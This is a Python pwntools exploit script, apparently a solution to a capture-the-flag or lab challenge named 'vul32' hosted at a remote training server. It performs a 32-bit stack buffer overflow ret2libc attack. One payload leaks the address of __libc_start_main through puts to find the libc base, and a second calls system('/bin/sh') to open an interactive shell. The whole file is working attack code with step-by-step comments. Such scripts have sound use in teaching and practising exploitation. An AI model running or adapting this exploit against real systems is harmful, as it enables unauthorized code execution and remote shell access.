from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']

# sh = process('./vul32/vul32')
# gdb.attach(sh)
sh = remote('cssc.vul337.team', 49294)

# sh = pwnlib.gdb.debug('./vul32/vul32') # not working, don't know why

vul32 = ELF('./vul32/vul32') # load the vul32 file
puts_plt = vul32.plt['puts'] # get the address of the puts function
libc_start_main_got = vul32.got['__libc_start_main'] # get the address of the __libc_start_main function
main = vul32.symbols['main'] # get the address of the main function

libc = ELF('./vul32/libc.so.6') # load the libc file
system_addr = libc.symbols['system'] # get the address of the system function in libc
binsh_addr = next(libc.search(b'/bin/sh')) # get the address of the "/bin/sh" string in libc

# create the payload 1, used to leak the address of the __libc_start_main function
payload = flat(['A' * 0x33, "G", puts_plt, main, libc_start_main_got])
sh.sendlineafter('Plz input something:\n', payload) # send the payload 1
sh.recv() # receive the output of the payload 1
sh.recv()

libc_start_main_addr_leak = u32(sh.recv()[1:5]) # starts with a "/n" character
# libc_start_main_addr_leak = u32(sh.recv()[len(flat(['A' * 0x33, "G"])) + 1:len(flat(['A' * 0x33, "G"])) + 5]) # this line is needed in local environment

libc_base = libc_start_main_addr_leak - libc.symbols['__libc_start_main'] # calculate the base address of libc

system_addr = libc_base + system_addr # calculate the address of the system function in libc
binsh_addr = libc_base + binsh_addr # calculate the address of the "/bin/sh" string in libc

payload = flat(['A' * 0x33, "G", system_addr, "bbbb", binsh_addr]) # create the payload 2, used to get the shell
sh.sendline(payload) # send the payload 2
sh.interactive() # get the shell
sh.close() # close the connection